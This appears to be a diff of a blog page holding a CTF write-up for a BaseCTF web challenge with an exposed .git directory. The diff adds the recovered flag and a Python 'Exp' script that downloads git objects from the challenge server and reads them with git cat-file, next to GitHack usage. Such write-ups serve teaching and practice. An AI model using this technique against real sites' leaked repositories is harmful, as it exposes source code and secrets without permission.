@@ -14,9 +14,11 @@
 <meta property="og:description" content="[比较复杂的&#x2F;.git泄露] find songthing盲猜robots协议 发现.git&#x2F; 存在git文件泄露，于是githack提取源码： 1234D:\githack\GitHack-master&gt;python githack.py http:&#x2F;&#x2F;challenge.imxbt.cn:32101&#x2F;.git&#x2F;[+] Download and parse index">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-04-09T11:34:00.000Z">
-<meta property="article:modified_time" content="2026-04-09T12:57:03.633Z">
+<meta property="article:modified_time" content="2026-05-21T09:31:02.901Z">
 <meta property="article:author" content="Li1yZer0">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="BASECTF">
+<meta property="article:tag" content="Git Leak">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
     
     
@@ -49,14 +51,16 @@
 
 <body>
     
-      <div id="header-post">
+      <div id="reading-progress-bar"></div>
+      
+        <div id="header-post">
   <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
   <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
   <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
   <span id="menu">
     <span id="nav">
       <ul>
-        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">写作</a></li>
+        <li><a href="/">首页</a></li><li><a href="/archives/">写作</a></li>
       </ul>
     </span>
     <br/>
@@ -93,15 +97,14 @@
 
     </div>
     <div id="toc">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag"><span class="toc-number">1.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">2.</span> <span class="toc-text">Exp</span></a></li></ol>
     </div>
   </span>
 </div>
 
-    
-    <div class="content index width mx-auto px2 my4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+      
+      <div class="content index width mx-auto px2 my4">
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
@@ -121,6 +124,11 @@
 
 
       
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/BASECTF/" rel="tag">BASECTF</a>, <a class="tag-link-link" href="/tags/Git-Leak/" rel="tag">Git Leak</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>
+    </div>
+
 
     </div>
   </header>
@@ -165,15 +173,19 @@
 <p>最后重复</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line"><span class="attribute">mkdir</span> -p .git/objects/db/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动文件</span></span><br><span class="line"><span class="attribute">mv</span> <span class="number">8</span>b21d3ebddd6826ee6f2583a6e4f56b3e9a736 .git/objects/db/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 见证奇迹的时刻</span></span><br><span class="line"><span class="attribute">git</span> cat-file -p db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736</span><br><span class="line"><span class="attribute">BaseCTF</span>&#123;<span class="number">1</span>aa62024-<span class="number">5</span>a12-<span class="number">4</span>f55-<span class="number">80</span>fa-cb9c41e1154b&#125;  </span><br></pre></td></tr></table></figure>
 
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">BaseCTF</span>&#123;<span class="number">1</span>aa62024-<span class="number">5</span>a12-<span class="number">4</span>f55-<span class="number">80</span>fa-cb9c41e1154b&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://challenge.imxbt.cn:32101&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_obj</span>(<span class="params">hash_obj</span>):</span><br><span class="line">    prefix = hash_obj[:<span class="number">2</span>]</span><br><span class="line">    rest = hash_obj[<span class="number">2</span>:]</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/.git/objects/<span class="subst">&#123;prefix&#125;</span>/<span class="subst">&#123;rest&#125;</span>&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        os.makedirs(<span class="string">f&quot;.git/objects/<span class="subst">&#123;prefix&#125;</span>&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;.git/objects/<span class="subst">&#123;prefix&#125;</span>/<span class="subst">&#123;rest&#125;</span>&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Read commit log</span></span><br><span class="line">r = requests.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/.git/logs/HEAD&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Commit log:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download target commit object</span></span><br><span class="line">fetch_obj(<span class="string">&quot;9d85f10e0192ef630e10d7f876a117db41c30417&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;git cat-file -p 9d85f10e0192ef630e10d7f876a117db41c30417&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download tree object</span></span><br><span class="line">fetch_obj(<span class="string">&quot;b5a27f2196dceb21778f2d6c7d8536bdca8534d2&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;git cat-file -p b5a27f2196dceb21778f2d6c7d8536bdca8534d2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download flag blob</span></span><br><span class="line">fetch_obj(<span class="string">&quot;db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;git cat-file -p db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736&quot;</span>)</span><br></pre></td></tr></table></figure>
+
 
   </div>
 </article>
 
 
 
-    </div>
-    
-      <div id="footer-post-container">
+      </div>
+      
+        <div id="footer-post-container">
   <div id="footer-post">
 
     <div id="nav-footer" style="display: none">
@@ -181,15 +193,13 @@
          
           <li><a href="/">首页</a></li>
          
-          <li><a href="/about/">关于</a></li>
-         
           <li><a href="/archives/">写作</a></li>
         
       </ul>
     </div>
 
     <div id="toc-footer" style="display: none">
-      
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag"><span class="toc-number">1.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">2.</span> <span class="toc-text">Exp</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -220,15 +230,15 @@
   </div>
 </div>
 
-    
-    <footer id="footer">
+      
+      <footer id="footer">
   <div class="footer-left">
-    版权所有 &copy; 2026 Li1yZer0
+    <span class="prompt">root@lily:~$</span> echo "&copy; 2026 Li1yZer0"
   </div>
   <div class="footer-right">
     <nav>
       <ul>
-        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">写作</a></li>
+        <li><a href="/">首页</a></li><li><a href="/archives/">写作</a></li>
       </ul>
     </nav>
   </div>
@@ -275,6 +285,7 @@
     }
   }
 </style>
+    
 </body>
 </html>
 <!-- styles -->
@@ -293,27 +304,23 @@
 <script src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js"></script>
 <script src="https://cdn.staticfile.org/meting/2.0.1/Meting.min.js"></script>
 
-<style>
-  /* 强制把播放器提到最上层，防止被挡住 */
-  .aplayer.aplayer-fixed {
-    z-index: 9999 !important; 
-    background: #1d1f21 !important;
-  }
-  .aplayer .aplayer-pic {
-    background-color: #2bbc8a !important;
-  }
-</style>
-
 <meting-js
-    server="netease" 
-    type="playlist" 
+    server="netease"
+    type="playlist"
     id="2672160214"
-    fixed="true" 
+    fixed="false"
     mini="true"
     autoplay="false"
     theme="#2bbc8a"
-    list-folded="true">
+    list-folded="true"
+    preload="auto">
 </meting-js>
+
+<style>
+  .aplayer {
+    display: none !important;
+  }
+</style>
 
 
 <script src="/lib/jquery/jquery.min.js"></script>
@@ -324,6 +331,19 @@
 
 <script src="/js/main.js"></script>
 
+
+<script src="/js/terminal.js"></script>
+
+
+<!-- Terminal init -->
+<script>
+$(function() {
+  if (window.Terminal && document.getElementById('term-container')) {
+    var posts = window.__TERM_POSTS || [];
+    window.Terminal.init(posts);
+  }
+});
+</script>
 
 
   
@@ -344,6 +364,15 @@
 
 
 <script>
+  /* 阅读进度条 */
+  $(window).on('scroll', function() {
+    var scrollTop = $(window).scrollTop();
+    var docHeight = $(document).height();
+    var winHeight = $(window).height();
+    var scrollPercent = (scrollTop / (docHeight - winHeight)) * 100;
+    $('#reading-progress-bar').css('width', scrollPercent + '%');
+  });
+
   $(document).ready(function() {
     // 监听目录点击
     $(document).on('click', '#toc a', function(e) {
